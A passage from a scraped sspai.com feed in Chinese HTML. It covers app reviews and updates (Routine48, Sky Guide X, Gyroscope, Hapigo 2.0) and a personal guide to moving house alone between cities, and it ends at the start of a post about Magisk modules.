中，我们可以添加两类日程，其中一种是特定时间段的日程，其添加方式和普通的日历应用并无二致，相应的日程持续时间、循环、颜色等都能自定义设置；第二类日程则和一天开始时间相关联，我们可以设置好自己的一天开始时间，之后在添加日程时，我们选定的时间就会和这个时间相关联。并且在后续更改一天开始时间后，日程时间都会重新进行自动排列。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4maq85b34tcu4bur05g.jpeg\"></figure><p>在 Routine48 的主界面上方，会给出一个简单的五天日历视图，然后日期周边会用彩色进度圆圈的形式来提示我们当天所有日程的完成进度，对于过期未完成的日程，圆圈下方也会给出提示，方便我们时时追踪自己的日程完成情况。此外，Routine48 还提供了一个非常实用的桌面小组件，使我们在手机桌面就能尽览后续的日程安排。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4maq8db34tcuopj7sog.jpeg\"></figure><p>你可以通过 <a href=\"https://play.google.com/store/apps/details?id=com.routine48\" target=\"_blank\">Play Store</a> 下载 Routine48，应用目前完全免费。</p>\n<span class=\"ss-application\" app-id=\"16153\"> </span><h2>值得关注的 App 更新</h2>\n<h3>Sky Guide X：感受星空的另一面</h3>\n<ul>\n<li>平台：iOS / iPadOS / watchOS</li>\n<li>关键词：星空、天文、科普、AR</li>\n</ul>\n<p><a class=\"ss-atUser\" data-mention=\"@化学心情下2\" user-id=\"bs2od75b34tch2730oa0\" href=\"https://sspai.com/u/liuxiaofengone\">@化学心情下2</a>：在喧闹的白天过后，明朗的夏日夜空闪烁着点点星光，没有云层干扰的夜空下进行星象观测自然再好不过。仰赖技术的进步也让我们可以通过智能手机为这些夜空中的星星「加上注释」，让我们可以更便捷地了解到这些星象以及背后的神话故事。</p>\n<p>Sky Guide 就是这样一款结合 AR 技术的观星 App，在没有云层的黑夜里打开 Sky Guide ，通过他的 AR 功能可以让那些叫不上名字的星星对应上他们的名字，而在最近的 10.0 更新中，你的观星体验还将更进一步，足不出户感受不同维度下的绚烂星空。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4maq8lb34tcu4bur060.jpeg\"></figure><p>看腻了家中附近那些习以为常的夜空，或许我们需要让这平淡无奇的星空加上一些惊喜，在 Sky Guide X 中加入了全新的「极光」效果，只需要在「主菜单 - 偏好设置」中打开「极光」，当前的画面中就会出现绚烂的极光——让原本平淡的夜空下多上几抹炫彩。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4maq8tb34tcvciqaav0.jpeg\"></figure><p>就现在的天空呈现上，Sky Guide 也在 10.0 版本中进行了调整，通过基于物理的空间计算实现了「大气多次散射」，这样当前地址下呈现的白天、暮色、黄昏以及夜空都变得无比真实，当然如果想要跟现实世界更加契合，那么打开「白天时星星消失」功能会让眼前的画面更为逼真。同时原本的星空艺术呈现上在 10.0 更新中也进行了大幅度的优化，比较直观的感受是星座的神话形象呈现更为立体，看上去栩栩如生（而不是简单的线条勾勒）。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4maq8tb34tcuopj7sp0.jpeg\"></figure><p>对于拥有激光雷达的设备，使用 Sky Guide X 并打开 AR 模式，将会有不太一样的体验——尤其是在室内对着天花板来观星，可以用手指「打碎」天花板，让绚烂的星空可以触手可及。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4maq95b34tcvciqaavg.jpeg\"></figure><p>Sky Guide X 中还对原本的搜索界面进行了重新设计，以视觉导向的全新目录浏览提供了全新的类别划分以及新的内容专题项目，对于天文爱好者而言，、Sky Guide X 将不仅仅只是简单的观星 App，而是一个天文知识的新宝库。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4maq9db34tcu4bur06g.jpeg\"></figure><p>你可以在 <a href=\"https://apps.apple.com/cn/app/sky-guide/id576588894?ign-itsct=apps_box_link&amp;ign-itscg=30200\" target=\"_blank\">App Store</a> 下载 Sky Guide X。</p>\n<span class=\"ss-application\" app-id=\"8925\"> </span><h3>Gyroscope 4.14：增加多项训练和习惯，完善每日报告</h3>\n<ul>\n<li>平台：iOS / watchOS / Web</li>\n<li>关键词：量化自我、健康监测</li>\n</ul>\n<p><a class=\"ss-atUser\" data-mention=\"@huhuhang\" user-id=\"bs2ovedb34tch278htb0\" href=\"https://sspai.com/u/huhuhang\">@huhuhang</a>：Gyroscope 应该是市面上最精美的量化自我 app 之一，近期推出的 4.14 版本包含了多项改动和新特性。</p>\n<p>首先是新的产品名称。Gyroscope 基础的 Pro 版本，包含全部的数据追踪和可视化。后续推出了 Gyroscope AI 和 Gyroscope X 均需要单独付费。如今，原 Pro 更名为 Track，Gyroscope AI 和 Gyroscope X 则分别更名为 Score 和 Coach。全新的产品名称还是值得肯定的，能更加简明扼要地体现出其包含的主要功能。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4maq9lb34tcu4bur070.png\"></figure><p>其次是 Health Labs 的改进，目前已经可以从教练选项卡的顶部快速访问 Health Labs，其中新增了多个测试项目，包括新的力量和减压习惯训练。而每一个习惯的评分都显示在 Health Labs 的顶部，方便重新测试。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/editor/u_/c4maq9tb34tcuopj7spg.jpeg\"></figure><p>Daily Journal 每日记录一直是 Gyroscope 的核心功能之一。Gyroscope 中的大多数指标都是自动量化和跟踪的，包括：睡眠、地点、旅行、步数、心率、音乐等。食物和心情等其他指标则需要手动测量和记录。如今，量化情绪既可以通过卡片选择，还支持添加文字描述你在做什么，以及你的感觉。Daily Report 每日报告则包含了更精简的时间轴标签，新的日志选项卡也可发布自定义笔记。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4maqa5b34tcu4bur07g.png\"></figure><p>在过去的几年里，我一直订阅并长期使用 Gyroscope，但其越来越「美丽」的价格让我觉得高不可攀了。当然，这也和 Gyroscope 的商业模式有关，作为一家 <a href=\"https://gyrosco.pe/privacy/\" target=\"_blank\">声明不出售用户数据</a> 的公司，Gyroscope 期望通过一小群目标用户养活自己，而并不期望变成一款大众应用。</p>\n<p>你可以在 <a href=\"https://apps.apple.com/cn/app/apple-store/id1104085053\" target=\"_blank\">App Store</a> 下载 Gyroscope。</p>\n<p><strong>关联阅读：</strong><a href=\"https://sspai.com/post/60430\" target=\"_blank\">「量化自我」不只是记录数据，我这样用 Gyroscope 改善生活健康</a></p>\n<span class=\"ss-application\" app-id=\"11251\"> </span><h3><strong>Hapigo 2.0：主题更丰富，效率更提升</strong></h3>\n<ul>\n<li>平台：macOS</li>\n<li>关键词：启动器、搜索工具</li>\n</ul>\n<p><a class=\"ss-atUser\" data-mention=\"@Snow\" user-id=\"bs2od75b34tch2730o80\" href=\"https://sspai.com/u/ul0vcezb\">@Snow</a>：之前曾在派评中推荐的 macOS 启动器 Hapigo 近期更新了 2.0 版，作为首次大版本更新，应用在颜值与效率上都有明显的提升。新版启动更为迅速，且每个独立窗口都支持设置置顶，当你需要在启动器上进行一系列操作时，不用再怕因误触而自动隐藏窗口了。</p>\n<p>2.0 版首次增支持多彩主题，原有深浅双色加入轻度的毛玻璃效果，UI 的精致程度有了肉眼可辨的提升。还新增了视觉友好的米黄色、豆绿色、天蓝色，以及类似于 MacPaw 系应用的三种渐变色主题，以满足用户的审美需求。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4maqadb34tcu4bur080.png\"></figure><p>旧版启动页在调用一般应用时，右侧预览区仅显示巨大图标，虽然醒目但缺乏功能性，显得非常浪费。2.0 版在图标的基础上增加路径、应用版本等元数据信息，而在调用一些系统功能时，你可以在右侧更改命令行和二次确认情况，算是在一定程度上将这块区域利用起来了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4maqalb34tcvt9nu7b0.jpeg\"></figure><p>作为一款效率工具，总是免不了和「剪贴板」杠上，Hapigo 2.0 中同样加入了一块轻量剪贴板，可以保留包括文字、链接、图片、文件等各类内容。剪贴板支持实时预览以及全键盘操作，Hapigo 也可以和 <a href=\"https://sspai.com/search/post/Alfred\" target=\"_blank\">Alfred</a> 一样通过搜索和回车快速复制了。如果你此前并未使用类似应用的习惯也不用担心，剪贴板右下角就是快捷键提醒，可以方便你快速上手。不过目前 Hapigo 最多支持 30 条历史记录，对于部分剪贴板重度用户来说可能会有些不太够用。所幸 Hapigo 的剪贴板支持应用黑名单，你可以将 1Password 之类的密码应用复制记录排除在外，在一定程度上节省剪贴板空间。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4maqatb34tcvt9nu7bg.png\"></figure><p>新版增加的「速译」和 OCR，也让 Hapigo 在效率方面与 Alfred 的差距进一步缩小。无需手动安装插件，应用内置有道、腾讯及 DeepL 三家翻译 API，你可以选择任一译文快速复制使用。Hapigo 的 OCR 识别表现也还不错，屏幕截图中的中英文字基本都能正确辨识，应用还在 OCR 结果中加入版式调整，你可以快速清除空格、空行，进行大小写转换和 URL 编解码等，进一步提升剪贴效率。但在测试中，我发现当识别内容过多时，文字会覆盖底部的功能按键，希望下一版本能修复这一问题。</p>\n<p>需要注意的是，Hapigo 2.0 几项新功能快捷键与常用的截图工具，如 iShot 等可能会有所冲突，导致部分功能异常。如果你在升级后发现一些快捷功能表现异常，可以优先排查一下是否有冲突。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/30/a2346efcd45bd8ca32ac438fa6fb794b.jpg\"></figure><p>新版启动器对应用的个性化支持也有所增加，你可以快速搜索并预览原生备忘录、Bear、DevonThink 及 Craft 的文字内容，微博、百度热搜排行则能让你站在吃瓜第一线，不会错过近期一个又一个的大瓜。新版应用还增加了快捷指令的支持，不过这需要升级到 macOS Monterey 才可使用。</p>\n<p>Hapigo 2.0 同样将采用订阅制模式，目前可全功能免费试用至 9 月 30 日，具体订阅价格将在后续公布。你可以在 <a href=\"https://hapigo.com/index.html\" target=\"_blank\">官网</a> 下载 Hapigo。</p>\n<h2>App 派评</h2>\n<ul>\n<li>Squash (macOS)：多功能图像处理工具上架 <a href=\"https://sspai.com/item/235\" target=\"_blank\">Setapp</a>。<a href=\"https://sspai.com/post/67655\" target=\"_blank\">查看少数派介绍 &gt;</a>\n</li>\n<li>Raindrop.io (<a href=\"https://blog.raindrop.io/search-2-0-6006bcc7f9a2\" target=\"_blank\">全平台</a>)：强化搜索功能，支持多种运算符关键词搜索等，搜索速度进一步提升。</li>\n<li>TestFlight for Mac 开启 Beta 版本测试。</li>\n</ul>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68538"},{"title":"三年辗转三座城市，「一个人」搬家可能没你想得那么难","date":"2021-08-30 08:00:41","description":"\n<h2>适用场景</h2>\n<p>本篇文章适用于在外租房且东西不多的朋友进行搬家时的选择规划，偏向于独自居住且没有很多大件家具的场景，不限于同城/跨城搬家。</p>\n<h2>离别旧住所</h2>\n<p>离开一个城市，不管是自己从小到大居住的地方，还是因为工作变动而选择的城市，我们在离开它之前多少都会有一些「迷恋」之物。</p>\n<h3>吃喝玩乐上的最后仪式感</h3>\n<p>这几年因为工作变动，辗转几个城市，每次在离开之前，我都会专门再去吃一次那些给我留下美味印象的食物。比如身为一个北方人，去了上海以后被鲜肉月饼抢走了味蕾，至此对甜味月饼毫无留恋，鲜肉月饼就是我的月饼最爱，现在不管去了哪还是会惦记鲜肉月饼，包括杭州汪保来的鲜肉榨菜月饼。</p>\n<p>当然除了一些地方特色美食，还有一些餐馆/景点可能让人印象深刻，觉得离开之后可能在其他地方真的不会再遇到。所以趁着离别这个城市之际，再去有仪式感的打卡一次，我觉得会让这次美食体验变得更加丰富。</p>\n<h3>提前心理/时间规划</h3>\n<p>当然除了抓紧最后时间的体验，我们还是要把重点放在「搬家」上。在开始准备动作之前，先给自己简单规划个时间框架。</p>\n<ul>\n<li>阶段一：搬入地的住所选择（考虑位置、租房成本、通勤时间、交通便利等），时间跨度可以包含阶段二</li>\n<li>阶段二：当前住所的收拾打包，建议用时 1-3 天之间</li>\n<li>阶段三：搬运物品/行李阶段</li>\n<li>阶段四：搬入新住所的收拾整理，建议用时 1-2 天</li>\n<li>阶段五：开启新城市体验（适用于跨城搬家场景）</li>\n</ul>\n<p>之所以要提前规划这些大框架，是因为对于我而言，每次想到搬家这个过程我就头大，会有一瞬间的恐慌和不知所措。但是当平静下来理出框架后，事情按照时间线进行后所有烦恼事情都会迎刃而解。所以时间框架不是为了局限你的准备时间，而是为了让自己不那么焦虑。</p>\n<p>其实不管是同城搬家还是跨城搬家，时间线上不建议大家准备的太久。一是时间线太长容易让人松懈，没有任务紧迫感。二是搬家这件事总会跳出来扰乱你的心情，所以还是尽快一口气处理完成最好。</p>\n<h2>那就开始吧</h2>\n<p>这几年跑遍北上广杭，经历了三次跨省搬家、一次同城换房后，对于「搬家」这个词，我已经从不知所措无处下手，到现在游刃有余不慌不忙。可以说是用亲身经历踩过了一些坑，也学到了一些经验。</p>\n<p>作为标准的社畜一枚、普通的租房人群，房间物品很符合女生该有的数量，衣服鞋子主要占大头，不是极简生活实践者。</p>\n<p>我认为「搬家」这件事从开始准备到最后完成，就像打王者一样，1 塔 2 塔逐步攻下，最后水晶前火力全开，VICTORY！</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4jg1blb34t9arh0b3n0.jpeg\"><figcaption>胜利✌️</figcaption></figure><h3>👊拿下一塔——前期准备</h3>\n<h4>新住所：提前找好落脚点</h4>\n<p>一般不管是跨省搬家还是同城，基本都是会先把落脚点找好后，再开始准备搬家事项。毕竟有了目标以后，会更有方向性的整理。</p>\n<p>像我之前去广州和上海，都是在家里通过网上资源（豆瓣 / zuber）来找个人房东和合租室友。缺点就是没法去现场看房，有些细节没法核对。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4jg1btb34t9a5fkksrg.png\"><figcaption>网络房源平台</figcaption></figure><p>现在基本都是住的自如，虽然房租会贵一点，但是会比较省心吧。不用自己单独再去办宽带什么的，维修也可以直接线上保修（或者贝壳找房）。</p>\n<p>当然，如果能碰上一个不收房客中介费还有一个较好的房东时，或许也会比什么都自己来搞要轻松一些。现在一些年轻的房东们一般在房间物品配置上还是比较完善的，有些缺失的沟通之后也会快速补齐，真的体验还是不错的。</p>\n<p><strong>关于更加细节的租房相关内容</strong>，之前少数派也有给大家整理过一篇面面俱到的内容：<a href=\"https://sspai.com/post/65727\" target=\"_blank\">从房源选择到好物分享，给准备租房的你一些小建议</a>，包含了很多我派作者的个人经历文章，基本上从选择住址到租房细节以及工具配备都有涉及，大家可以进行相关参考。</p>\n<h4>旧住所：部分物品的取舍</h4>\n<p>终于有自己的房间了，觉得新鲜好玩的都会买回来，甭管用不用得上，「新房间就该配新的」。然而搬家整理的时候你就会发现，好多东西买来就是占地方的，基本没用过。</p>\n<p>像以前我买过的：放在床上的小桌板 / 可夹在床板的看平板神器，虽然可能花费不怎么多，但是使用过后自己觉得利用率不高，属于没必要带走的东西，遂搬家时弃之。</p>\n<p>不过衣服鞋子这种就还好，一般一年周期内买的都不会嫌弃，但凡开始嫌弃的 / 突然觉得丑，可以放在闲鱼 / 捐出去（捐出去的效率会更高一点，闲鱼你需要预估时间成本）。</p>\n<p>线上衣服捐赠平台比如：飞蚂蚁、白鲸鱼等，都可以线上提交后上门回收，这些平台在支付宝里🔍「旧衣物回收」也可以便捷使用。</p>\n<p>另外一些物品，比如小桌子 / 台灯 / 部分碗筷厨具等，像我这个宜家的小桌子，如果快递的话，打包装箱难度挺大，还得考虑半路磕碰等，不如忍痛割爱留给下一个住户或者送人。但是同城搬家的话，还是会带上这个小东西的。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4jg1c5b34t9a5fkkss0.jpeg\"></figure><p>这种会额外增加运输途中的风险和难度的物品，不如用物流省下的钱，去购买一份新的，何乐而不为呢。</p>\n<h4>旧住所：打包物品攻略</h4>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4jg1cdb34t99b7ntfo0.png\"></figure><p><strong>📦打包纸箱</strong></p>\n<p>首先搬家必备——淘宝搜索「打包纸箱」即可，会有各种尺寸 / 有无把手扣等规格的纸箱。</p>\n<p>尺寸的话，针对个人搬家我比较推荐「60x40x50」或者「50x50x50」这两种规模的纸箱。比他们大的不方便拿，比他们小的随时都可以找到替代品。有无把手扣主要是方便搬运，有放手的地方总比一个箱子不知道抓哪发力更好一些。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4jg1clb34t9abj2c82g.jpeg\"><figcaption>手扣和尺寸参考</figcaption></figure><p>数量建议 3-4 个。其中一个用来装鞋子，鞋子多的也可以用两个纸箱。尤其是篮球鞋、商务通勤鞋都非常怕压。买鞋的鞋盒我都不会扔，就是为了搬家时保护鞋子。所以这种时候把他们都码到合适的鞋盒里，再通过形状穿插，最大程度的利用好纸箱空间。其余的见缝插针填补好即可。</p>\n<p>还可以再拿出来一个放书本类等规则型物品 / 收藏品等。需要注意的是，尤其是书本这种怕水或者部分怕碎的物品，都需要再进行额外的单独包装。</p>\n<p>其次，小体积的纸箱，完全可以利用一些平时收完快递没扔的快递盒子，在确定搬家日期前，刻意收集一些形状完好 / 干净的。用来装一些桌子上的物品 / 厨房里的调味品 / 卫生间的洗浴用品等中小型零散类，相比一整个大纸箱，这种会更方便搬过去后快速分类物品。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4jg1ctb34t99b7ntfog.jpeg\"><figcaption>分装说明书 / 各类袜子的箱子</figcaption></figure><p>需要注意的是，洗浴用品尤其是已经开封用过的，一定要在封口处用宽胶带做好严丝合缝的粘贴准备，防止流体的意外倾倒（胶带就很随意了，但是尽量用宽胶带，窄胶带用量很多还很费时间）。</p>\n<p>其实我平时生活里，就会利用一些好看的包装盒来装一些我的床边小物件 / 首饰等等，搬家的时候，这种只要包装一下封个口，到了新家直接拿出来立刻用，节省时间还不凌乱。</p>\n<p>一般这种可以合盖的 / 或者是一些零食带有分隔空间的包装盒，都可以利用起来。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4jg1dlb34t9a5fkkssg.jpeg\"><figcaption>日常用包装盒装一些小零碎</figcaption></figure><p><strong>🎒打包袋</strong></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4jg1e5b34t9arh0b3ng.png\"></figure><p>首先外购打包袋必备，一般用来装一些床上用品和不太重要的衣物（不怕压），所以一定要买防水材质的。</p>\n<p>尺寸方面，购买 2-3 个图下这种 105 升 / 126 升即可，其中一个用来装床上用品。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4jg1edb34t9abj2c830.jpeg\"><figcaption>尺寸参考</figcaption></figure><p>如果想要更精致地打包，可以再购置一些真空打包袋，对床品和衣服进行密闭封装后，再放入打包袋中，最大程度的利用打包袋「无形状包装」，可以塞更多东西。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4jg1elb34t99b7ntfp0.jpeg\"><figcaption>真空袋压缩效果</figcaption></figure><p>同时这种拉链口的，不用太担心会散落。因为在物流打包时，师傅会专门在外边再套一层编织袋的，然后再用胶带固定。而且这种拉链款，对于后期我们拆开收拾也会更简单一点。</p>\n<p>如果在打包后期有一些随身现在用着的物品，不想放进各种封口箱子等，你也可以放置在自己的包里 / 日常购物用来装衣服的手提袋等，</p>\n<p><strong>🧽额外准备：防震泡沫垫</strong></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4jg1elb34t9abj2c83g.jpeg\"></figure><p>防震泡沫垫的话，如果个人搬家，倒也没必要买那么大一卷，可以买这种方形的防震泡沫一打，然后塞在各个需要的角落，或者是套在外面。如果需要防震的物品很多且中型以上的偏多，那么可以考虑买一卷。</p>\n<p>当然，像我这种提前备货类型的人，有时候网购物品的快递中有放入的泡沫垫我都会提前攒起来，以备搬家/有需要时使用。</p>\n<p><strong>🙋推荐用途：</strong>隔离厨房用品 / 洗浴用品、包裹书本 / 中型摆件等易碎品，或者在每个打包盒底层放置，做好充足的减震措施。</p>\n<h3>👊二塔快速进击——中期运输准备</h3>\n<h4>🚚跨省：德邦大件 3.60</h4>\n<p>跨省的话，推荐用物流。这个物流不是说毕业时学校楼下那种物流，哪个便宜用哪个。自己搬家的话，还是找点运输站点都比较多的牌子。</p>\n<p>我跨省搬家一直用的是德邦物流。德邦有个专门运大件的业务 ------ 大件快递 3.60。具体的服务可以看下图的官网介绍，选择这个服务就是因为可以直接运送到家门，如果没有派送到家门口的话，可以直接进行投诉，整体体验还是不错的。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4jg1etb34t9a5fkkst0.png\"></figure><p><strong>💰成本预估</strong></p>\n<p>情况一：</p>\n<ul>\n<li>参考距离：上海到山东</li>\n<li>参考数量：三个纸箱（505050）+ 三个打包袋（105 升 * 3）全部装满</li>\n<li>参考价格：430 元</li>\n</ul>\n<p>情况二：</p>\n<ul>\n<li>参考距离：杭州到山东</li>\n<li>参考数量：三个纸箱+两个打包袋</li>\n<li>参考价格：330 元</li>\n</ul>\n<p><strong>📌额外注意事项</strong></p>\n<p>在叫师傅上门收件之前，一般快递员都会提前电话沟通，了解需要运输的物品数量（有几个箱子 / 几个袋子）这样师傅就会准备好车的空间，不至于来了以后一看东西太多而车子空间不允许，导致的时间耽搁。</p>\n<p>同时如果自备胶带的话，最好也还是叫师傅准备多个胶带。因为如果网购的纸箱厚度上不太完美的话，快递员会在封胶带的过程中进行多圈多角度多层数的封装，所以对于有多个打包袋的情况下，胶带的使用量会比较大。</p>\n<h4>🚚同城：货拉拉 / 自如搬家</h4>\n<p>同城的话就比较省心一点了，自己有车并可以搬运的话，当然可以自己搞定。对于租房一族而言，还是从网上找个搬家师傅来更划算一些（如果是这种个人租房，没必要叫搬家公司，我们只有运输的需求），推荐用「货拉拉」和「蓝犀牛」，比较实惠。但是具体使用起来可能每个人的体验都不太一样，但是货拉拉是默认不上楼搬运的，所以一定要提前跟师傅沟通好。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4jg1f5b34t9abj2c840.png\"></figure><p>如果你是租的自如的房子，也可以直接在自如 APP 里用「自如搬家」的业务，不管是价格还是车型规模，跟货拉拉也差不多（我这次搬家就是体验的自如小面包车，20 公里花了 135 元，其中用了 20 元优惠券。师傅全程帮忙搬运的，都很放心）。</p>\n<p>日常租房（合租）搬家的话，1～2 人一辆小面包车完全可以搞定。如果是整租的话，可以根据物品数量以及常住人口数，选择面包车 / 大一点的货车进行搬运。3 人以上就可以考虑中型面包车。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4jg1fdb34t9a5fkkstg.png\"><figcaption>参考价格</figcaption></figure><p><strong>💰成本预估</strong></p>\n<p>一般北上广的话，同城基本都是 100-200 元间就差不多可以搞定。可以提前在软件上输入距离和部分需求进行金额的预估。</p>\n<p><strong>📌额外注意事项</strong></p>\n<p>不管住的地方有没有电梯，都要跟师傅提前沟通好搬运时能否上楼帮忙（搬走和搬入都需要），加多少钱可上楼搬运，除非你想借此锻炼身体，其他情况下真的建议能帮忙就帮忙吧。血的教训，太累了。</p>\n<h4>💎有钱人的选择：无需操心的一站式搬家服务</h4>\n<p>当然也有那种「一站式搬家服务」，会有专门的人来上门帮你收拾整理，然后按照日式风格分箱打包，后期再帮你布置还原。</p>\n<p>之前在微博看钟文泽老师就使用的这种搬家方式，搬一趟人力花费💰大概是 3000-6000 元之间。国外 YouTube 上也有类似服务的实拍视频，如果你是那种害怕整理和恐惧搬家的人儿，可以去油管上看一下。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4jg1flb34t9a5fkksu0.jpeg\"><figcaption>来自钟文泽微博</figcaption></figure><h4>我派读者的推荐</h4>\n<p>上次写的那篇搬家指南发布时，评论区的读者也是给了很多很好的推荐。比如推荐大家直接买房的，或者直接一个被子当包裹齐活的等等，大家也可以相应做下参考，一步到位买房（bushi</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4jg1ftb34t9abj2c84g.png\"></figure><h3>👊挺进高地——后期收拾整理</h3>\n<p>当你确定了「快递师傅会把行李送到家门」「搬家师傅帮你抬行李到家里」的话，后期收拾的过程你会轻松一些。</p>\n<p>其实我个人而言，对于搬家前的整理，我会更头疼搬家后的整理。因为看到那满屋子的东西，我就觉得跟无底洞一样。</p>\n<p>在真正撸起袖子开干前，我们需要先对自己的新住处有个大概规划，提前规划好各种物料的摆放布局。你可以根据之前的房间摆放去还原位置，也可以根据新环境重新布置。</p>\n<p>我建议是每次都重新规划一次，就像重置新鲜感一样。有时候同一件物品，因为摆放角度不同，都会让你觉得耳目一新的波动。</p>\n<p>关于家居收纳方法，可以参考 <a href=\"https://book.douban.com/subject/26649651/\" target=\"_blank\">《麻理惠的整理魔法》</a>。这本书中有对家居收纳提出的六大法则，以及针对多个场景「衣柜」「书架」「小物品」「厨房」「纪念品」进行的详细剖析（麻理惠本人看起来就很温柔 555）</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4jg1gdb34t99b7ntfpg.jpeg\"></figure><p>如果你不喜欢看长篇文字，奈飞上也有麻理惠的真人秀节目 <a href=\"https://www.netflix.com/hk/title/80209379\" target=\"_blank\">《怦然心动的人生整理魔法》</a>，类似于《粉雄救兵》（Queer Eye）的展现方式，每一集都会去到一个家庭，帮助他们重塑和改变。这个会更有趣味性和实用性，B 站上也有搬运的 <a href=\"https://www.bilibili.com/video/av40850969/\" target=\"_blank\">中字视频</a>，看到下边大家的评论，觉得是一个看了不会后悔的节目。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4jg1glb34t99b7ntfq0.png\"><figcaption>B 站网友评论</figcaption></figure><p>当然，少数派的作者们对于收纳整理也有过非常详细的分享，更多关于细节收纳内容可以参考以下文章：</p>\n<ul>\n<li><a href=\"https://sspai.com/post/66723\" target=\"_blank\">东西我都装好了 | 「古方」新用：用「5S」法则重塑你的收纳整理逻辑 - 少数派</a></li>\n<li><a href=\"https://sspai.com/post/66792\" target=\"_blank\">东西我都装好了 | 该扔的我也扔掉了 - 少数派</a></li>\n</ul>\n<h3>🎉水晶前的胜利——享受过程</h3>\n<p>像我们这种自己参与全部搬家过程的，虽然说有点费力，但是可以在收拾东西过程中，梳理物品的使用价值和使用频率，矫情一点还能回忆物品的来源（不管是开心的还是不开心的，但都是你经历过的）。当然，也有可能会在某个角落收获意外钱财。</p>\n<p>我在这几次的搬家整理时，会慢慢发现自己的一些整理短板。我有很多物品都处于「存在好像也没什么用，丢了又觉得挺可惜的」状态，然后我的处理方法就是：全都留下来，早晚有一天会用到。</p>\n<p>就像我们平时收藏网站 / 干货视频等等，马了就等于做了。放在收藏夹里，它就没有展示出来自己的使用价值，哪怕你不用但是你分享出去了，被有需要的人是用了，那么你就完成了对这个「物品」的使用价值传递。</p>\n<p>所以当这个东西处于「存在好像没什么用，丢了又觉得可惜」时，要么自己用起来，要么分享给需要的人。</p>\n<p>学会舍弃一些当下「不需要的物品」，才会有更多的空间去容纳真正让自己提高效率和幸福的东西。</p>\n<p>搬家大概就是这样吧。</p>\n<h2>题外话：新城市需探索</h2>\n<p>其实我还挺喜欢自己去一个新城市居住，因为对我而言这是一个新体验，会有我之前没有接触过的环境和美食（有吃的就会心情好）。</p>\n<p>我自己新去一个城市时，都会首先把所住地附近的美食/公园/商场都打卡一遍，拿着相机扫一圈自然风光，没准会有新收获。然后在后续空闲时间，逐渐扩大行动圈去打卡更多美食和有趣场所。</p>\n<p>所以如果你是一个刚到新环境的所谓「城市陌生人」，不妨带上相机，打开大众点评，找到那个让你看一眼就想立刻去品尝/体验的地方，然后忘我地去感受新城市吧！</p>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端 </a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号 </a>，了解更妙的数字生活 🍃</p>\n<p>&gt; 特惠、好用的硬件产品，尽在 <a href=\"https://shop549593764.taobao.com/\">少数派 sspai 官方店铺</a> 🛒</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68479"},{"title":"Android 玩家入门：从这 20+ 个模块感受 Magisk 背后的魔力","date":"2021-08-30 06:33:37","description":"\n<h3><strong>Matrix 首页推荐</strong></h3>\n<p><a href=\"https://sspai.com/matrix\">Matrix</a> 是少数派的写作社区，我们主张分享真实的产品体验，有实用价值的经验与思考。我们会不定期挑选 Matrix 